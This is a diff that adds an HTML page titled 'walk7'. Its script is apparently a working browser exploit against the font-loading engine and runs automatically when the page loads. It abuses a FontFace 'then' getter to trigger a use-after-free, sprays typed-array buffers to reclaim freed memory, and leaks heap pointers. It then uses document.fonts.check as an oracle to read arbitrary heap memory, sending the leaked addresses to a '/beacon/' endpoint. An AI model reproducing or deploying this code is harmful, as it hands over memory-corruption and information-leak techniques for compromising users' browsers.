@@ -1,0 +1,163 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>walk7</title></head>
+<body>
+<div id="V" style="position:sticky;top:0;z-index:9;font:700 14px monospace;padding:.4rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">walk7</div>
+<pre id="O">walk7 — L2 scan + P3 deep</pre>
+<script>
+'use strict';
+var O=document.getElementById('O');
+function b(m){try{O.textContent+='\n'+m;}catch(e){}}
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/W7-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+function vd(ok,t){var v=document.getElementById('V');v.style.background=ok?'#e3f5e6':'#fde2e1';v.style.color=ok?'#0f5a20':'#8c1010';v.textContent=t;}
+bs('BOOT');
+
+var K=16,PW=60,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+
+function start(){
+  AT++;if(AT>1)return;
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,PW);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);if(L1===0n){L1=a;L2=c;}}
+  }
+  bs('L1-'+hex(L1)+'-L2-'+hex(L2));
+  if(!bufs.length||L2===0n){bs('NOLEAK');vd(false,'NOLEAK');return;}
+  var l2hi=Number((L2>>32n)&0xFFFFFFFFn);
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;
+    vb[8]=Number(bufs[ib][1]&0xFFn);vb[9]=Number((bufs[ib][1]>>8n)&0xFFn);
+    vb[10]=Number((bufs[ib][1]>>16n)&0xFFn);vb[11]=Number((bufs[ib][1]>>24n)&0xFFn);
+    vb[12]=Number((bufs[ib][1]>>32n)&0xFFn);vb[13]=0;vb[14]=0;vb[15]=0;
+    vb[0x10]=0;vb[0x82]=0;
+  }
+  for(var ip=0;ip<bufs.length;ip++){
+    bufs[ip][0][0x38]=0x21;bufs[ip][0][0x39]=0x43;bufs[ip][0][0x3A]=0;bufs[ip][0][0x3B]=0;
+    bufs[ip][0][0x3C]=0x21;bufs[ip][0][0x3D]=0x43;bufs[ip][0][0x3E]=0;bufs[ip][0][0x3F]=0;
+  }
+
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      setTimeout(function(){
+        var fam=null;
+        for(var q=0;q<faces.length;q++){
+          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}
+          if(r===false){fam='zz'+q;break;}
+        }
+        if(!fam){bs('NOTIN');vd(false,'NOTIN');return;}
+        for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=1;bufs[is2][0][0x2C]=1;}
+
+        var n3=0,BUDGET=117;
+        var chkS='1em '+fam;
+        var mkCP=String.fromCodePoint(0x4321);
+        var cp0=String.fromCodePoint(0);
+        var cpHi=(l2hi>0&&l2hi<=0x10FFFF)?String.fromCodePoint(l2hi):null;
+
+        function chk(cc){try{return document.fonts.check(chkS,cc);}catch(e){return null;}}
+        function setA(addr){
+          for(var ir=0;ir<bufs.length;ir++){
+            var u=bufs[ir][0];
+            u[0x20]=Number(addr&0xFFn);u[0x21]=Number((addr>>8n)&0xFFn);
+            u[0x22]=Number((addr>>16n)&0xFFn);u[0x23]=Number((addr>>24n)&0xFFn);
+            u[0x24]=Number((addr>>32n)&0xFFn);u[0x25]=0;u[0x26]=0;u[0x27]=0;
+          }
+        }
+
+        var STEP=0xC0n;
+        var raw=L1-0x80000n,rem=((raw%STEP)+STEP)%STEP;
+        var base=raw-rem+0x80n;if(base>raw)base-=STEP;
+        var hitAddr=0n,selfAddr=0n;
+        for(var idx=0;idx<80;idx++){
+          if(n3>=BUDGET)break;
+          var ca=base+BigInt(idx)*STEP;
+          setA(ca+0x38n);n3++;
+          if(chk(mkCP)===true){hitAddr=ca;break;}
+        }
+        if(hitAddr!==0n){
+          for(var d=-20;d<=20;d++){
+            if(n3>=BUDGET)break;
+            var ca2=hitAddr+BigInt(d)*STEP;
+            setA(ca2+0x6Cn);n3++;
+            if(chk(cp0)===false){
+              if(cpHi){n3++;if(chk(cpHi)===true){selfAddr=ca2;break;}}
+              else{selfAddr=ca2;break;}
+            }
+          }
+        }
+        if(selfAddr===0n){bs('NOSELF');vd(false,'NOSELF');return;}
+        bs('SELF-'+hex(selfAddr)+'-n3='+n3);
+
+        var rl=bufs[0][0];
+        var P3=le(rl,0x18);
+        var E0=le(rl,0x00);  // engine qword at reclaim+0
+        var E20=le(rl,0x20); // engine qword at reclaim+0x20
+
+        // Report the raw hex dump values directly (no oracle cost)
+        bs('RAW-E0='+hex(E0)+',E20='+hex(E20)+',P3='+hex(P3));
+
+        function bsearch(aimAddr){
+          setA(aimAddr);
+          var lo=0,hi=0x10FFFF;
+          for(var s=0;s<21;s++){
+            n3++;if(n3>BUDGET)return -1;
+            var mid=lo+((hi-lo)>>1);
+            var r=chk(String.fromCodePoint(mid));
+            if(r===true)hi=mid;else lo=mid+1;
+          }
+          return lo;
+        }
+
+        // ALL reads from KNOWN-MAPPED heap addresses only (safe from crashes)
+        // Read at +2 offset for address family detection (byte4)
+
+        // L2 target: never successfully scanned
+        var l2q0=bsearch(L2+2n);    // L2 qword 0
+        var l2q1=bsearch(L2+10n);   // L2 qword 1
+        var l2q2=bsearch(L2+18n);   // L2 qword 2
+        var l2q3=bsearch(L2+26n);   // L2 qword 3
+
+        // P3 target: scan deeper qwords (4-7)
+        var p3q4=bsearch(P3+34n);   // P3 qword 4
+        var p3q5=bsearch(P3+42n);   // P3 qword 5
+
+        bs('L2-q0='+l2q0.toString(16)+',q1='+l2q1.toString(16)+',q2='+l2q2.toString(16)+',q3='+l2q3.toString(16));
+        bs('P3-q4='+p3q4.toString(16)+',q5='+p3q5.toString(16));
+        b('L2: '+[l2q0,l2q1,l2q2,l2q3].map(function(v){return '0x'+v.toString(16);}).join(' '));
+        b('P3+32,+40: 0x'+p3q4.toString(16)+' 0x'+p3q5.toString(16));
+        bs('DONE-n3='+n3);
+        vd(n3<=BUDGET,'walk7 n3='+n3);
+      },40);
+    },30);
+  },40);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
